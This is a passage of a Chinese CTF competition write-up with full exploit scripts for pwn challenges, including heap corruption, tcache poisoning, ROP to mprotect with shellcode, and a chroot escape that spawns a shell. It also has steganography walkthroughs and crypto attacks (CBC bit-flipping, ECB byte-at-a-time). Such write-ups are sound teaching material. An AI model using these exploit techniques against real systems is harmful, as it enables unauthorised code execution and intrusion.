data               :sh.send(str(data))    sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))    sl      &#x3D; lambda data               :sh.sendline(str(data))    sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))    r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb,timeout&#x3D;5)    ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop,timeout&#x3D;5)    irt     &#x3D; lambda                    :sh.interactive()    uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))    uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))    lg      &#x3D; lambda data               :log.success(data)    def add(size):        sla(&quot;:&quot;,&quot;A&quot;);        sla(&quot;?&quot;,str(size));    def free(idx):        sla(&quot;:&quot;,&quot;D&quot;);        sla(&quot;?&quot;,str(idx))    def edit(idx,content):        sla(&quot;:&quot;,&quot;E&quot;)        sla(&quot;?&quot;,str(idx))        sa(&quot;:&quot;,content)    def show(idx):        sla(&quot;:&quot;,&quot;S&quot;)        sla(&quot;?&quot;,str(idx))    add(0x18)    add(0x18)    add(0x58)    add(0x18)    add(0x78)    payload &#x3D; &quot;\x11&quot; * 0x18 + p8(0x81)    edit(0,payload)    free(1)    add(0x78)    free(4)    payload &#x3D; &quot;\x11&quot; * 0x18 + p64(0x81) + &quot;\n&quot;    edit(1,payload)    free(2)    payload &#x3D; &quot;\x11&quot; * 0x18 + p64(0xdeadbeefdeadbeef) + &quot;\n&quot;    edit(1,payload)    show(1)    ru(&quot;\x11&quot; * 0x18 + p64(0xdeadbeefdeadbeef))    heap_base &#x3D; uu64(r(6)) - 0x320    payload &#x3D; &quot;\x11&quot; * 0x18 + p64(0x81)    payload +&#x3D; p64(heap_base + 0x10) + &quot;\n&quot;    edit(1,payload)    add(0x78)    add(0x78)    payload &#x3D; p64(0) * 4 + p64(0x0f0f0f0f0f0f0f0f) + p64(0) * 9 + p64(heap_base + 0x10) + &quot;\n&quot;    edit(4,payload)    free(4)    add(0x78)    show(4)    ru(&quot;content:&quot;)    main_arena &#x3D; uu64(r(6))    success(&quot;main_arena &#x3D; &quot;+hex(main_arena))    libc &#x3D; main_arena - lib.symbols[b&#39;__malloc_hook&#39;] - 96 - 0x10    success(&quot;libc &#x3D; &quot;+hex(libc))    lib.address &#x3D; libc    system &#x3D; lib.symbols[b&#39;system&#39;]    __free_hook &#x3D; lib.symbols[b&#39;__free_hook&#39;]    success(&quot;libc_base &#x3D; &quot;+hex(libc))    success(&quot;sys_addr &#x3D; &quot;+hex(system))    payload &#x3D; p64(0) * 4 + p64(0x0f0f0f0f0f0f0f0f) + p64(0) * 9 + p64(__free_hook - 8) + &quot;\n&quot;    edit(4,payload)    add(0x78)    edit(5,&quot;&#x2F;bin&#x2F;sh\x00&quot; + p64(system) + &quot;\n&quot;)    free(5)    irt()if __name__ &#x3D;&#x3D; &#39;__main__&#39;:pwn(ip, port, 0)</code></pre><h2 id="corporate-slave"><a href="#corporate-slave" class="headerlink" title="corporate_slave"></a><strong>corporate_slave</strong></h2><p>1）本题为glibc2.27保护全开</p><p>2）题目逻辑比较简单，只有一个add功能，并且漏洞点很明显off by X(null)，通过readSize的索引来往地址中写一个0字节</p><p>3）难点在于如何利用，我们知道当我们malloc一个大的堆块（0x200000）时就会使用mmap来分配堆块，此时堆地址紧挨libc,因此我们可以利用这一点来往libc范围内写0字节，那该往哪里写呢</p><p>4）我们首先需要泄露libc，通过源码我们可以知道要想泄露数据需要完成的流程是：puts-&gt;_IO_file_xsputn-&gt;_IO_file_overflow-&gt;_IO_new_do_write-&gt;_IO_SYSWRITE (fp, data, to_do);通过条件判定我们需要满足以下条件fp-&gt;_flags &amp;~ 0x1000 &amp;&amp; fp-&gt;_IO_read_end  = fp-&gt;_IO_write_base,由于0xfbad2887 &amp; 0x1000已经满足了条件，因此只需要让 fp-&gt;_IO_read_end  = fp-&gt;_IO_write_base即可进入_IO_SYSWRITE (fp, fp-&gt;_IO_write_base,fp-&gt;_IO_write_base-fp-&gt;_IO_write_ptr ),从而泄露libc，那泄露libc之后呢？</p><p><img src="https://uploader.shimo.im/f/4Wrb3Z8dPllRHzK1.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>5）我们第三次写0字节考虑往stdin里面写，将fp-&gt;_IO_buf_base的最后一字节写为0,此时io_buf_base恰好指向io_file的头部，因此我们可以伪造整个io_file，那如何getshell呢？</p><p><img src="https://uploader.shimo.im/f/GLzFOo2JkxgRPsk4.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>6）我们采用二重写入的方法来将另一部分的io_file写入到stdout，从而当puts的时候通过io_str_overflow来获取shell，那如何二重写入，我们研究一下stdin的源码可以知道，程序在写入之后会回调到_IO_getline，而_IO_getline里面判断了fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr是否小于0若小于0则调用__uflow,因此我们需要让fp-&gt;_IO_read_end - fp-&gt;_IO_read_ptr小于0，在__uflow里面又调用了_IO_default_uflow而此函数调用了_IO_file_underflow，这里就达成了我们二次写入的条件，我们知道第一次只能读0x84的数据因此剩下我们发送的就会通过_IO_SYSREAD (fp, fp-&gt;_IO_buf_base, fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);向fp-&gt;_IO_buf_base写入，此时fp-&gt;_IO_buf_base已经被我们修改为了stdout的头部，因此可以实现二次写入，我们布置好stdout结构体的值使其走向io_str_overflow通过以下源码getshell</p><p><img src="https://uploader.shimo.im/f/kUMenw2JTgtqU5bK.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>最后获取flag</p><h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><p>1.  漏洞点利用了abs()函数本身存在的漏洞缺陷，当输入的是0x80000000的时候，会导致整数溢出，进而导致堆溢出。</p><p>2.  考察了加解密知识，对于输入输出进行了DES_CBC加解密转换，需要掌握des_CBC加解密方法才能正常获取输入输出。</p><p>3.  设置了seccomp限制了system execve函数的利用，也就是说劫持got表的方式不可用，并且禁用了open函数，对于seccomp函数理解不深刻pwn手来说，便以为不能利用open read wirte 的shellcode来读取shellcode了。但其实我只是禁用了64位的open函数，32位的open函数仍可以利用，因此我们写32位的shellcode利用open read write来读取flag。</p><p>4.  具体方式就是劫持stack,利用rop链执行mprotect函数赋予执行权限，然后跳转到shellcode执行shellcode。</p><pre><code class="hljs plain">from PwnContext import *import sysreload(sys)sys.setdefaultencoding(&#39;utf-8&#39;)from pyDes import *from binascii import b2a_hex, a2b_hextry:from IPython import embed as ipyexcept ImportError:print (&#39;IPython not installed.&#39;)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]context.log_level &#x3D; &#39;info&#39;# functions for quick scripts       &#x3D; lambda data               :ctx.send(str(data))        #in case that data is an intsa      &#x3D; lambda delim,data         :ctx.sendafter(str(delim), str(data))sl      &#x3D; lambda data               :ctx.sendline(str(data))sla     &#x3D; lambda delim,data         :ctx.sendlineafter(str(delim), str(data))r       &#x3D; lambda numb&#x3D;4096          :ctx.recv(numb)ru      &#x3D; lambda delims, drop&#x3D;True  :ctx.recvuntil(delims, drop)irt     &#x3D; lambda                    :ctx.interactive()rs      &#x3D; lambda *args, **kwargs    :ctx.start(*args, **kwargs)dbg     &#x3D; lambda gs&#x3D;&#39;&#39;, **kwargs    :ctx.debug(gdbscript&#x3D;gs, **kwargs)# misc functionsuu32    &#x3D; lambda data   :u32(data.ljust(4, &#39;\0&#39;))uu64    &#x3D; lambda data   :u64(data.ljust(8, &#39;\0&#39;))ctx.binary &#x3D; &#39;.&#x2F;pwn&#39;ctx.remote &#x3D; (&quot;62.234.32.102&quot;, 10000)def add(idx,size):sla(&#39;ice&#39;,0)sla(&#39;where would you like to put&#39;,idx)sla(&#39;how long do your want to input&#39;,size)def delete(idx):sla(&#39;ice&#39;,1)sla(&#39;which one do you want to delete&#39;,idx)def show(idx):sla(&#39;ice&#39;,2)sla(&#39;which one do you want to show&#39;,idx)ru(&#39;is :\n&#39;)def edit(idx,content):sla(&#39;ice&#39;,3)sla(&#39;which one do you want to change&#39;,idx)sa(&#39;now you can change your diary&#39;,content)def change(idx,content):sla(&#39;ice&#39;,4)sa(&#39;index&#39;,idx)sa(&#39;IV&#39;,content)def read_shellcode():ascii &#x3D; &quot;&quot;with open(&#39;shellcode&#39;,&#39;r&#39;) as f:data &#x3D; f.readlines()data &#x3D; data[0]data &#x3D; str(data)[1:-2]odom &#x3D; data.split(&#39;,&#39;)ascii &#x3D; map(int,odom)#return asciix86_shellcode &#x3D; &quot;&quot;for i in range(len(ascii)):x86_shellcode +&#x3D; chr(ascii[i])return x86_shellcodedef decrypto_data(data):with open(&#39;cipher&#39;,&#39;w&#39;) as f:f.write(data)payload &#x3D; &#39;.&#x2F;cbc &#39;os.system(payload)sleep(1)cleartext &#x3D; &quot;&quot;with open(&#39;plain&#39;,&#39;r&#39;) as f:cleartext &#x3D; f.read(8)return cleartextdef lg(s,addr):print(&#39;\033[1;31;40m%20s--&gt;0x%x\033[0m&#39;%(s,addr))rs(&#39;remote&#39;)KEY &#x3D; &quot;\0\0\0\0\0\0\0\0&quot;IV &#x3D; &quot;\0\0\0\0\0\0\0\0&quot;k &#x3D; des(KEY, CBC, IV, pad&#x3D;None, padmode&#x3D;PAD_PKCS5)ru(&#39;gift :&#39;)heap_leak &#x3D; int(r(4),16)#leak libcadd(0,0x38)add(1,0x38)add(2,0x38)add(3,0x38)add(4,0x38)add(15,0x38)change(0x80000000,&#39;\x00&#39;+chr(heap_leak+1)+&#39;\n&#39;)edit(15,p64(0xc1)*2+&#39;\n&#39;)delete(0)add(5,0x38)show(1)data &#x3D; decrypto_data(r(8))libc &#x3D; uu64(data[:6])#print hexdump(data)libc_base &#x3D; libc - 0x3c4be8#dbg()print &#39;libc_base &#x3D; &#39; + hex(libc_base)#leak stackenviron &#x3D; libc_base + 0x3c6f38print &#39;environ &#x3D; &#39; + hex(environ)change(0x80000000,p64(environ)+&#39;\n&#39;)#dbg()show(15)data &#x3D; decrypto_data(r(8))stack &#x3D; uu64(data[:6])main_ret &#x3D; stack - 0xf0print &#39;main_ret : &#39; + hex(main_ret)libc_leak_heap &#x3D; libc_base + 0x3c4b80#leak heapchange(0x80000000,p64(libc_leak_heap)+&#39;\n&#39;)#dbg()show(15)data &#x3D; decrypto_data(r(8))heap_base &#x3D; uu64(data[:4]) - 0x140print &#39;heap_base : &#39; + hex(heap_base)lg(&#39;heap_base&#39;,heap_base)#raw_input()#get shell#dbg()edit(4,&#39;.&#x2F;flag&#x2F;asdad&#x2F;wer&#x2F;po&#x2F;tr&#x2F;flag\n&#39;)# edit(4, &#39;.&#x2F;flag.txt\n&#39;)payload &#x3D; &#39;python shellcode.py &#39;+str(heap_base)os.system(payload)shellcode &#x3D; read_shellcode()pop_rdx &#x3D; libc_base + 0x1b92pop_rsi &#x3D; libc_base + 0x202f8pop_rdi &#x3D; 0x021112 + libc_basemprotect &#x3D; 0x101830 + libc_basechange(0x80000000,p64(main_ret)+&#39;\n&#39;)payload &#x3D; p64(pop_rdi) + p64(heap_base) + p64(pop_rsi)  + p64(0x1000) + p64(pop_rdx) + p64(7) + p64(mprotect)edit(15,payload)change(0x80000000,p64(main_ret+0x38)+&#39;\n&#39;)edit(15,p64(heap_base+0x150)+&#39;\n&#39;)#dbg()edit(1,shellcode[:0x20]+&#39;\n&#39;)change(0x80000000,p64(heap_base+0x170)+&#39;\n&#39;)#dbg()edit(15,shellcode[0x20:]+&#39;\n&#39;)#dbg()sla(&#39;ice&#39;,5)irt()</code></pre><p>还有一个点是flag的位置，如果直接执行cat flag拿到的是假flag，需要自己探测flag目录。<br>shellcode，DES_CBC加解密，查找flag的脚本【也可以手动】就不放了 自己尝试。</p><h2 id="jailbreak"><a href="#jailbreak" class="headerlink" title="jailbreak"></a><strong>jailbreak</strong></h2><p>通过off by one实现tcache attack，修改money。从而获得dup的fd，通过劫持tcache结构体（中间可能需要修复tcache_num），劫持__free_hook为setcontext，执行chdir(fd)来实现chroot逃逸。</p><pre><code class="hljs plain"># -*- coding: utf-8 -*-import sysimport osfrom time import *from pwn import *#log_level[&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]context.log_level &#x3D; b&quot;CRITICAL&quot;remote_ip        &#x3D; b&#39;127.0.0.1&#39;remote_port      &#x3D; 9999binary_file      &#x3D; &#39;.&#x2F;%s&#39; % &quot;jailbreak&quot;#context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]local_libc_file  &#x3D; b&#39;.&#x2F;libc-2.27.so&#39;remote_libc_file &#x3D; b&#39;&#39;def exploit(sh,remote &#x3D; False,awd &#x3D; False,awd_binary_file &#x3D; &#39;&#39;):global binary_file,local_libc_file,remote_ip,remote_port,local_libc_file,remote_libc_fileelf &#x3D; context.binaryif (awd or remote) and remote_libc_file !&#x3D; &quot;&quot;:lib &#x3D; ELF(remote_libc_file)else:lib &#x3D; elf.libc if local_libc_file &#x3D;&#x3D; b&quot;&quot; else ELF(local_libc_file)s       &#x3D; lambda data               :sh.send(str(data))sa      &#x3D; lambda delim,data         :sh.sendafter(str(delim), str(data))sl      &#x3D; lambda data               :sh.sendline(str(data))sla     &#x3D; lambda delim,data         :sh.sendlineafter(str(delim), str(data))r       &#x3D; lambda numb&#x3D;4096          :sh.recv(numb)ru      &#x3D; lambda delims, drop&#x3D;True  :sh.recvuntil(delims, drop)irt     &#x3D; lambda                    :sh.interactive()uu32    &#x3D; lambda data               :u32(data.ljust(4, b&#39;\x00&#39;))uu64    &#x3D; lambda data               :u64(data.ljust(8, b&#39;\x00&#39;))ru7f    &#x3D; lambda                    :u64(sh.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#39;\x00&#39;))ruf7    &#x3D; lambda                    :u32(sh.recvuntil(&quot;\xf7&quot;)[-4:].ljust(4,b&#39;\x00&#39;))lg      &#x3D; lambda data               :log.success(data)def add(name_size,description_size):sla(&quot;Action:&quot;,&quot;B&quot;)sla(&quot;Item name size:&quot;,str(name_size))sla(&quot;Item description size:&quot;,str(description_size))def edit(idx,name,description):sla(&quot;Action:&quot;,&quot;M&quot;)sla(&quot;idx:&quot;,str(idx))if name !&#x3D; &quot;&quot;:sla(&quot;Modify name?[y&#x2F;N]&quot;,&quot;y&quot;)sa(&quot;new name:&quot;,str(name))else:sla(&quot;Modify name?[y&#x2F;N]&quot;,&quot;n&quot;)if description !&#x3D; &quot;&quot;:sla(&quot;Modify description?[y&#x2F;N]&quot;,&quot;y&quot;)sa(&quot;new description:&quot;,str(description))else:sla(&quot;Modify description?[y&#x2F;N]&quot;,&quot;n&quot;)def free(idx):sla(&quot;Action:&quot;,&quot;S&quot;)sla(&quot;idx:&quot;,str(idx))def show():sla(&quot;Action:&quot;,&quot;W&quot;)def backdoor():sla(&quot;Action:&quot;,&quot;\xFF&quot;)sla(&quot;Action[y&#x2F;N]&quot;,&#39;y&#39;)add(0x18,0x18)add(0x18,0x18)edit(0,&#39;\x11&#39; * 0x18 + &quot;\n&quot;,&#39;\x12&#39; * 0x18 + &quot;\n&quot;)free(0)add(0x18,0x18)show()ru(&quot;Item name: &quot;)heap_base &#x3D; uu64(r(6)) - 0x280edit(0,&#39;\x13&#39; * 0x18 + &quot;\n&quot;,&#39;\x14&#39; * 0x18 + p8(0x41))free(0)add(0x18,0x29)free(1)edit(0,&#39;\x13&#39; * 0x18 + &quot;\n&quot;, &#39;\x14&#39; * 0x18 + p64(0x21) + p64(heap_base + 0x250 + 0x10) + &quot;\n&quot; )free(0)add(0x18,0x18)add(0x18,0x18)edit(1,&#39;\x15&#39; * 0x18 + &quot;\n&quot;,p64(0xcafecafe) + &quot;\n&quot;)backdoor()ru(&quot;secret:&quot;)dir_fd &#x3D; int(ru(&quot;\n&quot;).strip(),10)add(0x28,0x28)add(0x28,0x28)edit(2,&#39;\x16&#39; * 0x28 + p8(0x51),&quot;\n&quot;)free(2)add(0x28,0x48)free(3)edit(2,&#39;\x16&#39; * 0x28 + &quot;\n&quot;,&#39;a&#39; * 0x28 + p64(0x31) + p64(heap_base + 0x010) + &quot;\n&quot;)add(0x28,0x28)add(0x28,0x38)edit(4,p64(0x0800000000000000) + &quot;\n&quot;,p64(0xcafecafecafecafe) + &quot;\n&quot;)add(0x38,0x38)add(0x38,0x38)edit(5,&#39;\x15&#39; * 0x38 + p8(0x91),&#39;\x16&#39; * 0x18 + &#39;\n&#39;)edit(6,&#39;\n&#39;,p64(0) + p64(0x31) + &quot;\n&quot;)free(5)add(0x38,0x38)show()ru(&quot;Item idx: 5&quot;)ru(&quot;description: &quot;)main_arena &#x3D; uu64(r(6)) - 224libc &#x3D; main_arena - 0x10 - lib.symbols[b&#39;__malloc_hook&#39;]lib.address &#x3D; libcsystem &#x3D; lib.symbols[b&#39;system&#39;]binsh &#x3D; lib.search(b&quot;&#x2F;bin&#x2F;sh\x00&quot;).next()__free_hook &#x3D; lib.symbols[b&#39;__free_hook&#39;]__malloc_hook &#x3D; lib.symbols[b&#39;__malloc_hook&#39;]pop_rdi_ret &#x3D; libc + 0x000000000002155fpop_rsi_ret &#x3D; libc + 0x0000000000023e8apop_rdx_ret &#x3D; libc + 0x0000000000001b96pop_rdx_rsi_ret &#x3D; libc + 0x0000000000130889ret &#x3D; libc + 0x00000000000008aaadd(0x38,0x38)free(6)edit(7,p64(heap_base + 0x60) + &quot;\n&quot;,p64(0xcafecafecafecafe) * 4 + p64(0x3c0 + heap_base) + p64(ret) + &quot;\n&quot;)add(0x38,0x48)add(0x38,0x48)edit(8,p64(0xdeadbeefdeadbeef) + &quot;\n&quot;,p64(lib.sym[&#39;__free_hook&#39;]) + &quot;\n&quot;)edit(4,p64(0x0800000000010000) + &quot;\n&quot;,p64(0xcafecafecafecafe) + &quot;\n&quot;)add(0x38,0x48)edit(9,p64(lib.sym[&#39;setcontext&#39;] + 53) + &quot;\n&quot;,&#39;\n&#39;)edit(5,p64(pop_rdi_ret) + p64(0) + p64(pop_rdx_rsi_ret) + p64(0x1000)+ p64(heap_base + 0x3b0) + p64(lib.sym[&#39;read&#39;])+&quot;\n&quot;,&#39;\n&#39;)free(7)payload &#x3D; &#39;a&#39; * 64payload +&#x3D; p64(pop_rdi_ret) + p64(dir_fd)payload +&#x3D; p64(lib.sym[&#39;fchdir&#39;])payload +&#x3D; p64(pop_rdi_ret) + p64(binsh)payload +&#x3D; p64(ret)payload +&#x3D; p64(system)sl(payload)sleep(0.5)sl(&quot;echo deadbeef &amp;&amp; cd ..&#x2F; &amp;&amp; cat flag.txt&quot;)ru(&quot;deadbeef&quot;)irt()def CTF_exploit(argv):global remote_ip,remote_port,binary_fileargv_len &#x3D; len(argv)context.log_level &#x3D; b&quot;DEBUG&quot;context.binary &#x3D; binary_fileif argv_len &#x3D;&#x3D; 1:sh &#x3D; process(binary_file)exploit(sh)returnelif argv_len &#x3D;&#x3D; 3:sh &#x3D; remote(argv[1],argv[2])exploit(sh,remote &#x3D; True)returnelse:sh &#x3D; process(binary_file)exploit(sh)if __name__ &#x3D;&#x3D; b&quot;__main__&quot;:CTF_exploit(sys.argv)</code></pre><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="耗子尾汁"><a href="#耗子尾汁" class="headerlink" title="耗子尾汁"></a>耗子尾汁</h2><h3 id="1-2-9M的gif图"><a href="#1-2-9M的gif图" class="headerlink" title="1. 2.9M的gif图"></a>1. 2.9M的gif图</h3><p>binwalk分离后得到2^4_2^5_2^6.mp4，flag.txt</p><p><img src="https://uploader.shimo.im/f/LZKCfwlRSbvKxI6T.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>其中flag.txt当然是假的</p><h3 id="2-2-4-2-5-2-6-mp4"><a href="#2-2-4-2-5-2-6-mp4" class="headerlink" title="2. 2^4_2^5_2^6.mp4"></a>2. 2^4_2^5_2^6.mp4</h3><p>再次binwalk分离得到有密码的压缩包</p><p><img src="https://uploader.shimo.im/f/yBicI6a1ZmX8MJLc.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>但没有提示密码相关信息，爆破可能性不大，所以逐帧看mp4文件得到c2lnbl9pbg==</p><p><img src="https://uploader.shimo.im/f/XjRtB1gtTXkELpny.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>base64解码后得到”sign_in”即为压缩包密码</p><h3 id="3-19-20-txt"><a href="#3-19-20-txt" class="headerlink" title="3. 19_20.txt"></a>3. 19_20.txt</h3><p>解压后看到一长串字符串  拿去解base64后还是一长串奇奇怪怪的东西</p><p><img src="https://uploader.shimo.im/f/Lirv8Y77Ismw2DQA.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>想到mp4文件的名字很奇怪”2^4_2^5_2^6”  可以猜到base64，base32，base16依次解开后即为txt文件内提示的最后一层单表替换密码</p><p>txt文件的名字”19_20” 为仿射加密的两个参数a，b的值，解开即为flag字符串</p><p><img src="https://uploader.shimo.im/f/K4UjMPzcGS6X4q5g.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>按题目要求的格式改为 flag{you_have_signed_in_successfully} 即可</p><p>弱弱说一句，这道题的提示全在<strong>文件名</strong></p><p>2^4_2^5_2^6对应base16.32.64编码，19_20对应仿射的两个参数</p><p>然后可以解得flag</p><h2 id="找找吧"><a href="#找找吧" class="headerlink" title="找找吧"></a><strong>找找吧</strong></h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><p>下载附件是一个压缩包，解压发现需要密码，把压缩包拖到十六进制查看器里，最后有解压密码，解压后有两个文件，一个MP3文件，一个压缩包，压缩包有密码，所以只能检测MP3文</p><p>件。</p><p><img src="https://uploader.shimo.im/f/CbeKRwZJv543H54n.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>MP3文件可以正常播放，也可能用一些播放器无法播放，会显示一张图片，直接将mp3文件放入audacity中会导致无法正常加载，因此将MP3文件放入十六进制查看器，由文件头可以看出是rar文件，将后缀名改为rar，解压，（如果是adobe的audacity不需要这一步）得到一张图片和一个MP3文件。图片里写明没用，所以不管图片，MP3文件播放，是首看似很正常的歌，但是如果将进度条拖到最后会发现有不正常的声音，用audacity打开，发现音频最后有不正常的音频。</p><p><img src="https://uploader.shimo.im/f/VgUicY4u4i86Ehb6.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>放大后发现可能是摩斯密码，解密后得到字符串，去解压缩包，发现密码错误，观察字符串格式，可能是md5，解密后得到真密码，解压压缩包，得到一个gif文件和hint.png文件，gif文件可以看到一个字符串，可以用各种工具逐帧查看</p><p><img src="https://uploader.shimo.im/f/JHj3Yvw6guczdhtw.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>png文件很明显少了底下的一部分，在十六进制查看器中更改图片高度，具体更改位数百度，后得到提示Veni,vidi,vici,</p><p><img src="https://uploader.shimo.im/f/xTEbvXqhMaxLxhw5.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>百度发现这是凯撒大帝的名言，因此得知是凯撒密码加密，而位移的位数等于加密后的flag在gif中的帧数即九位，也可以一位一位试出来，最终得到flag。</p><h2 id="来猜谜了"><a href="#来猜谜了" class="headerlink" title="来猜谜了"></a>来猜谜了</h2><p>压缩包打开后是一个 png 图片</p><p><img src="https://uploader.shimo.im/f/LfQezP9Ity1hMZtS.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>关键信息：老色批，首字母是lsp，应该可以联想到lsb隐写，用stegslove将数据提取出来。</p><p><img src="https://uploader.shimo.im/f/VK0zoxrYvfYiNikU.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>从文件头可以看出隐写进去的是zip文件，直接保存为zip就行了。不过也有师傅是直接用binwalk分离出来，然后将文件修补好的。</p><p><img src="https://uploader.shimo.im/f/4snkonIWULh60DF5.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>分离出的压缩包打开后有一个 mi.jpg 和一个流量数据包。</p><p><img src="https://uploader.shimo.im/f/l2YJ4gt5p4jfKYf1.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>用wireshark打开流量包可以看到是usb协议，且leftover capture data域的数据长度为八个字节，所以可以判断出是键盘流量包。在kali中用tshark命令将leftover capture data域的数据提取出来。</p><p><img src="https://uploader.shimo.im/f/KrN0dkxTGBAQT1Fz.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/dj736PeK6172ZiuO.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>然后就可以直接用键盘流量分析的脚本把敲击了哪些键分析出来，网上这种脚本很多，我就这不发了，嘿嘿。</p><p><img src="https://uploader.shimo.im/f/x7NRizqekrUWHZCA.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>得到的字符串是：AG DX AG DX AG DX</p><p>这是一串用ADFGX编码方式加密的字符串</p><p><img src="https://uploader.shimo.im/f/F5MONqpWR7qNt9GJ.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>通过对照表就可以得到明文: gogogo</p><p>然后就剩mi.jpg了，flag是隐写在mi.jpg中的，隐写方式是outguess隐写，gogogo就是密钥。其实题目名和题目说明都有猜，这就是在提示隐写方式。直接用工具把flag分离出来就行了</p><p><img src="https://uploader.shimo.im/f/VDhocWMekyTrTrYl.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p><img src="https://uploader.shimo.im/f/jPi6VXXUoeRWzgnj.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a><strong>套娃</strong></h2><p>我的题确实简单队友把我想出得先出了，没法知识点不可能重复把。唉挺难受得把想在bash里去藏key得结果有得比赛先出了。唉我背锅把出简单</p><p>一个xlsx文件，直接改后缀为zip,解压得到一个xlsx和一个RC4data.txt,</p><p>xlsx文件在改后缀为zip解压得一个xlsx文件和一个加密得zip文件</p><p>在xlsx文件尾可以找到压缩包密码解压得到密钥</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="happy"><a href="#happy" class="headerlink" title="happy"></a>happy</h2><pre><code class="hljs plain">#exp.happy#python3import binasciiimport gmpy2from z3 import *s &#x3D; Solver()p&#x3D;Int(&#39;p&#39;)q&#x3D;Int(&#39;q&#39;)s.add(q+q*p**3 &#x3D;&#x3D; 1285367317452089980789441829580397855321901891350429414413655782431779727560841427444135440068248152908241981758331600586)s.add(p*q+q*p**2 &#x3D;&#x3D;1109691832903289208389283296592510864729403914873734836011311325874120780079555500202475594)if s.check() &#x3D;&#x3D; sat:    print(s.model())n&#x3D;0x989f5774c6f199031dc64d5aad7907665ea5e03cde2d74da21e&#x3D;0x872a335c&#x3D;0x7a7e031f14f6b6c3292d11a41161d2491ce8bcdc67ef1baa9ep &#x3D; 1158310153629932205401500375817q &#x3D; 827089796345539312201480770649phi&#x3D;(p-1)*(q-1)d&#x3D;gmpy2.invert(e,phi)m&#x3D;pow(c,d,n)print(binascii.unhexlify(hex(m)[2:].strip(&quot;L&quot;)))</code></pre><h2 id="Yusa的密码学课堂—CBC第一课"><a href="#Yusa的密码学课堂—CBC第一课" class="headerlink" title="Yusa的密码学课堂—CBC第一课"></a><strong>Yusa的密码学课堂—CBC第一课</strong></h2><ol><li>这一题的考点是CBC的字节翻转，需要对CBC模式具有一定了解</li></ol><p><img src="https://uploader.shimo.im/f/WVFDhwOTXIBjatXj.png!thumbnail?fileGuid=Kt3HyjK6vqgC38Cg" alt="图片"></p><p>可见在解密时是先进行AES解密，随后异或iv(或者前一组密文)才得到明文。</p><ol start="2"><li>在这一题中，我们的用户名在二组（除去iv），所以在第二次交互我们修改第一组密文的对应字节，就可以让用户名对应的字节翻转。</li><li>改了第一组密文的一个字节后，解密时整个明文会乱掉，不满足”yusa”<em>4的条件，对此我们需要最后一次交互改整个iv，计算规则就是: 原来的iv^第一组明文(乱)^“yusa”</em>4</li></ol><h2 id="Yusa的密码学课堂—ECB"><a href="#Yusa的密码学课堂—ECB" class="headerlink" title="Yusa的密码学课堂—ECB"></a><strong>Yusa的密码学课堂—ECB</strong></h2><p>1.由于是ECB的模式，所以当我们输入十五个’0’后，服务会将十五个’0’+flag加密，而此时第一组就是十五个’0’和flag的第一个字符。即，返回的明文的第一组是’0’*15 + flag[0]的密文。</p><p>2.我们遍历0-255，发送’0’*15+chr(i)，看返回的密文是不是和最初获得的密文的第一组一致，如果一致，那么此时的chr(i)就是flag的第一位。</p><p>3.有了第一位我们就可以发送’0’<em>14+flag[0]过去，此时返回的第一组密文就是’0’</em>14+flag[0]+flag[1]的密文了，我们继续用第2步的方法就可以恢复flag[1]了。</p><p>4.如此循环往复，逐位爆破flag。</p><pre><code class="hljs python">   <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span>         sh = remote(<span class="hljs-string">&quot;0.0.0.0&quot;</span>,<span class="hljs-string">&quot;9999&quot;</span>)              pre=<span class="hljs-string">&quot;0&quot;</span>*<span class="hljs-number">47</span>         flag=<span 